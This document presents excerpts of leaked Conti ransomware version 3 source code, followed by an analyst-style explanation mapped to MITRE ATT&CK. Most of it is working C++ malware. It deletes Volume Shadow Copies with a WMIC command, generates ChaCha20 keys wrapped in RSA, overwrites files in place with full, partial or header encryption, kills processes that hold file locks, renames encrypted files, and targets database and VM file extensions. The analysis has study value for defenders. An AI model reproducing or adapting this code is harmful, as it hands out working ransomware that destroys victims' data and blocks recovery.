# Conti Ransomware v3 - Hybrid ChaCha20/RSA File Encryption

## Repository
**MalwareSourceCode-main** → Win32/Ransomware/Win32.Conti.c/Conti Source Code Version 3

## Source File Path
`/Win32/Ransomware/Win32.Conti.c/Conti Source Code Version 3/cryptor/cryptor.cpp`

## Language
C/C++

## Code Snippet

### Shadow Copy Deletion (Lines 200-270)
```cpp
// Step 6: Use WMI to enumerate and delete shadow copies
BSTR WqlStr = pSysAllocString(OBFW(L"WQL"));
BSTR Query = pSysAllocString(OBFW(L"SELECT * FROM Win32_ShadowCopy"));

IEnumWbemClassObject* pEnumerator = NULL;
hres = pSvc->ExecQuery(
    WqlStr,
    Query,
    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
    NULL,
    &pEnumerator);

// Enumerate shadow copies
while (pEnumerator)
{
    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
    
    if (0 == uReturn) break;
    
    VARIANT vtProp;
    // Get shadow copy ID
    hr = pclsObj->Get(OBFW(L"ID"), 0, &vtProp, 0, 0);
    
    WCHAR CmdLine[1024];
    RtlSecureZeroMemory(CmdLine, sizeof(CmdLine));
    wsprintfW(CmdLine, OBFW(L"cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete"), vtProp.bstrVal);
    
    LPVOID Old;
    pWow64DisableWow64FsRedirection(&Old);
    CmdExecW(CmdLine);  // Execute shadow copy deletion
    pWow64RevertWow64FsRedirection(Old);
    
    pVariantClear(&vtProp);
    pclsObj->Release();
}
```

### ChaCha20 Key Generation (Lines 690-725)
```cpp
STATIC
BOOL
GenKey(
    __in HCRYPTPROV Provider,
    __in HCRYPTKEY PublicKey,
    __in cryptor::LPFILE_INFO FileInfo
)
{
    DWORD dwDataLen = 40;
    
    morphcode(FileInfo);
    
    // Generate random 32-byte ChaCha20 key
    if (!pCryptGenRandom(Provider, 32, FileInfo->ChachaKey)) {
        return FALSE;
    }
    
    morphcode(FileInfo->ChachaKey);
    
    // Generate random 8-byte ChaCha20 IV (nonce)
    if (!pCryptGenRandom(Provider, 8, FileInfo->ChachaIV)) {
        return FALSE;
    }
    
    morphcode(FileInfo->ChachaIV);
    
    // Initialize ChaCha20 cipher context
    RtlSecureZeroMemory(&FileInfo->CryptCtx, sizeof(FileInfo->CryptCtx));
    ECRYPT_keysetup(&FileInfo->CryptCtx, FileInfo->ChachaKey, 256, 64);
    ECRYPT_ivsetup(&FileInfo->CryptCtx, FileInfo->ChachaIV);
    
    // Copy key+IV into buffer (32 + 8 = 40 bytes)
    memory::Copy(FileInfo->EncryptedKey, FileInfo->ChachaKey, 32);
    memory::Copy(FileInfo->EncryptedKey + 32, FileInfo->ChachaIV, 8);
    
    morphcode(FileInfo->EncryptedKey);
    
    // Encrypt the ChaCha20 key+IV with RSA public key
    if (!pCryptEncrypt(PublicKey, 0, TRUE, 0, FileInfo->EncryptedKey, &dwDataLen, 524)) {
        return FALSE;
    }
    
    return TRUE;
}
```

### File Encryption - Header Mode (Lines 905-965)
```cpp
STATIC
BOOL
EncryptHeader(
    __in cryptor::LPFILE_INFO FileInfo,
    __in LPBYTE Buffer,
    __in HCRYPTPROV CryptoProvider,
    __in HCRYPTKEY PublicKey
)
{
    BOOL Success = FALSE;
    DWORD BytesRead = 0;
    DWORD BytesToRead = 0;
    DWORD BytesToWrite = 0;
    LONGLONG TotalRead = 0;
    LONGLONG BytesToEncrypt;
    LARGE_INTEGER Offset;
    
    BytesToEncrypt = 1048576;  // Encrypt first 1MB only
    
    while (TotalRead < BytesToEncrypt) {
        
        morphcode(TotalRead);
        
        LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
        morphcode(BytesLeft);
        
        BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;
        morphcode(BytesToRead);
        
        Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
        if (!Success || !BytesRead) {
            break;
        }
        
        morphcode(BytesRead);
        
        TotalRead += BytesRead;
        BytesToWrite = BytesRead;
        
        morphcode(TotalRead);
        
        // Encrypt buffer in-place with ChaCha20
        ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);
        
        morphcode(Buffer);
        
        // Rewind file pointer to overwrite with encrypted data
        Offset.QuadPart = -((LONGLONG)BytesRead);
        if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
            break;
        }
        
        morphcode(Offset.QuadPart);
        
        Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
        if (!Success) {
            break;
        }
        
        morphcode(BytesToWrite);
    }
    
    return TRUE;
}
```

### Partial Encryption with Configurable Modes (Lines 967-1100)
```cpp
STATIC
BOOL
EncryptPartly(
    __in cryptor::LPFILE_INFO FileInfo,
    __in LPBYTE Buffer,
    __in HCRYPTPROV CryptoProvider,
    __in HCRYPTKEY PublicKey,
    __in BYTE DataPercent
)
{
    BOOL Success = FALSE;
    DWORD BytesRead = 0;
    LONGLONG TotalRead = 0;
    LONGLONG BytesToEncrypt;
    LARGE_INTEGER Offset;
    LONGLONG PartSize = 0;
    LONGLONG StepSize = 0;
    INT StepsCount = 0;
    
    // Select encryption strategy based on percentage
    switch (DataPercent) {
    case 10:
        PartSize = (FileInfo->FileSize / 100) * 4;
        StepsCount = 3;
        StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
        break;
        
    case 20:
        PartSize = (FileInfo->FileSize / 100) * 7;
        StepsCount = 3;
        StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
        break;
        
    case 50:
        PartSize = (FileInfo->FileSize / 100) * 10;
        StepsCount = 5;
        StepSize = PartSize;
        break;
    // ... more percentage options
    }
    
    // Encrypt multiple chunks distributed across file
    for (INT i = 0; i < StepsCount; i++) {
        
        TotalRead = 0;
        BytesToEncrypt = PartSize;
        
        // Skip to next chunk position (intermittent encryption)
        if (i != 0) {
            Offset.QuadPart = StepSize;
            if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
                break;
            }
        }
        
        while (TotalRead < BytesToEncrypt) {
            // Read, encrypt with ChaCha20, rewind, write encrypted data
            // (Similar pattern to EncryptHeader)
        }
    }
    
    return TRUE;
}
```

### File Handle Hijacking (Lines 820-900)
```cpp
STATIC
DWORD
OpenFileEncrypt(__in cryptor::LPFILE_INFO FileInfo)
{
    DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo->Filename);
    if (Attributes != INVALID_FILE_ATTRIBUTES) {
        if (Attributes & FILE_ATTRIBUTE_READONLY) {
            // Remove read-only attribute
            pSetFileAttributesW(FileInfo->Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);
        }
    }
    
    FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
        GENERIC_READ | GENERIC_WRITE,
        0,  // Exclusive access
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    
    DWORD LastError = (DWORD)pGetLastError();
    if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)
    {
        if (LastError == ERROR_SHARING_VIOLATION ||
            LastError == ERROR_LOCK_VIOLATION)
        {
            logs::Write(OBFW(L"File %s is already open by another program."), FileInfo->Filename);
            
            // Terminate process holding file lock
            if (KillFileOwner(FileInfo->Filename))
            {
                logs::Write(OBFW(L"KillFileOwner for file %s - success"), FileInfo->Filename);
                
                // Retry file open after killing process
                FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    NULL,
                    OPEN_EXISTING,
                    0,
                    NULL);
                
                if (FileInfo->FileHandle == INVALID_HANDLE_VALUE) {
                    logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
                    return FALSE;
                }
            }
            else {
                logs::Write(OBFW(L"KillFileOwner for file %s - error. GetLastError = %lu."), FileInfo->Filename, pGetLastError());
                return FALSE;
            }
        }
        else {
            logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
            return FALSE;
        }
    }
    
    LARGE_INTEGER FileSize;
    if (!pGetFileSizeEx(FileInfo->FileHandle, &FileSize) || !FileSize.QuadPart) {
        logs::Write(OBFW(L"Can't get file size %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
        CloseHandle(FileInfo->FileHandle);
        return FALSE;
    }
    
    FileInfo->FileSize = FileSize.QuadPart;
    return TRUE;
}
```

### File Extension Modification (Lines 665-685)
```cpp
BOOL
cryptor::ChangeFileName(__in LPCWSTR OldName)
{
    LPWSTR NewName = (LPWSTR)memory::Alloc(32727);
    if (!NewName) {
        return FALSE;
    }
    
    morphcode((LPVOID)NewName);
    
    plstrcpyW(NewName, OldName);
    morphcode((LPVOID)NewName);
    
    // Append custom extension (configured globally)
    plstrcatW(NewName, global::GetExtention());
    
    morphcode((LPVOID)OldName);
    
    // Rename file with new extension
    pMoveFileW(OldName, NewName);
    memory::Free(NewName);
    return TRUE;
}
```

### Targeted Database and VM File Detection (Lines 285-525)
```cpp
STATIC
BOOL
CheckForDataBases(__in LPCWSTR Filename)
{
    LPCWSTR Extensions[] =
    {
        OBFW(L".4dd"), OBFW(L".4dl"), OBFW(L".accdb"), OBFW(L".accdc"),
        OBFW(L".mdb"), OBFW(L".sql"), OBFW(L".sqlite"), OBFW(L".sqlite3"),
        OBFW(L".sqlitedb"), OBFW(L".pdb"), OBFW(L".dbf"), OBFW(L".odb"),
        // ... 60+ database extensions
    };
    
    INT Count = sizeof(Extensions) / sizeof(LPWSTR);
    
    for (INT i = 0; i < Count; i++) {
        morphcode((LPVOID)Filename);
        
        if (pStrStrIW(Filename, Extensions[i])) {
            return TRUE;  // Mark for special handling
        }
    }
    
    return FALSE;
}

STATIC
BOOL
CheckForVirtualMachines(__in LPCWSTR Filename)
{
    LPCWSTR Extensions[] =
    {
        OBFW(L".vdi"), OBFW(L".vhd"), OBFW(L".vmdk"), OBFW(L".pvm"),
        OBFW(L".vmem"), OBFW(L".vmsn"), OBFW(L".vmsd"), OBFW(L".nvram"),
        OBFW(L".vmx"), OBFW(L".raw"), OBFW(L".qcow2"), OBFW(L".subvol"),
        OBFW(L".bin"), OBFW(L".vsv"), OBFW(L".avhd"), OBFW(L".vmrs"),
        OBFW(L".vhdx"), OBFW(L".avdx"), OBFW(L".vmcx"), OBFW(L".iso")
    };
    
    INT Count = sizeof(Extensions) / sizeof(LPWSTR);
    for (INT i = 0; i < Count; i++) {
        morphcode((LPVOID)Filename);
        
        if (pStrStrIW(Filename, Extensions[i])) {
            return TRUE;  // Prioritize VM/backup files
        }
    }
    
    return FALSE;
}
```

## Explanation

This is **Conti Ransomware Version 3**, a highly sophisticated file encryption malware used by the Conti cybercrime syndicate for targeted ransomware attacks. The implementation exemplifies professional ransomware engineering with multiple anti-recovery and optimization features.

**Encryption Architecture:**
- **Hybrid Cryptography**: Uses ChaCha20 stream cipher for file encryption (fast, secure) combined with RSA asymmetric encryption for key protection. Each file receives a unique 32-byte ChaCha20 key and 8-byte IV generated via `CryptGenRandom()`, which are then encrypted with an embedded RSA public key (the corresponding private key is held by attackers).
- **Configurable Partial Encryption**: Implements three modes: FULL_ENCRYPT (entire file), PARTLY_ENCRYPT (intermittent chunks at configurable percentages: 10%, 20%, 50%, 70%, 80%), and HEADER_ENCRYPT (first 1MB only). Partial encryption significantly speeds up encryption on large files/drives while still rendering files unusable.
- **In-Place Encryption**: Overwrites original file data directly (read → encrypt → rewind → write) to avoid disk space issues and complicate forensic recovery.

**Anti-Recovery Mechanisms:**
- **Shadow Copy Deletion**: Uses WMI COM interfaces to enumerate all Windows Volume Shadow Copies and executes `wmic shadowcopy delete` commands, preventing Windows System Restore and shadow-based file recovery.
- **Process Termination**: Implements `KillFileOwner()` functionality that terminates processes holding file locks (databases, office applications, backup software) to gain exclusive file access.
- **Restart Manager API**: Uses Windows Restart Manager (`RmStartSession`, `RmRegisterResources`, `RmShutdown`) to forcefully close applications accessing target files.

**File Targeting:**
- Maintains extensive whitelists of database extensions (.mdb, .sql, .sqlite, .accdb - 60+ formats) and virtual machine files (.vmdk, .vhd, .vhdx, .vmem, .qcow2 - 20+ formats) for prioritized encryption, maximizing damage to business-critical data.
- Appends custom extensions to encrypted files via `ChangeFileName()` and `MoveFileW()` to mark encrypted status.

**Evasion Techniques:**
- Obfuscates strings with `OBFW()` macro and uses `morphcode()` function calls throughout to potentially evade static analysis and break signature-based detection.
- Uses dynamic API resolution (not shown in snippet but referenced via `p` prefix: `pCryptGenRandom`, `pCreateFileW`) to avoid import table scanning.

This directly aligns with **MITRE ATT&CK T1486 (Data Encrypted for Impact)** as the sole purpose is to encrypt victim files to extort ransom payments. The shadow copy deletion supports **T1490 (Inhibit System Recovery)**, and the process killing supports **T1489 (Service Stop)**. Conti was responsible for numerous high-profile attacks including healthcare ransomware incidents before the group's dissolution in 2022, with this source code leaked by a Ukrainian researcher during the Russia-Ukraine conflict.
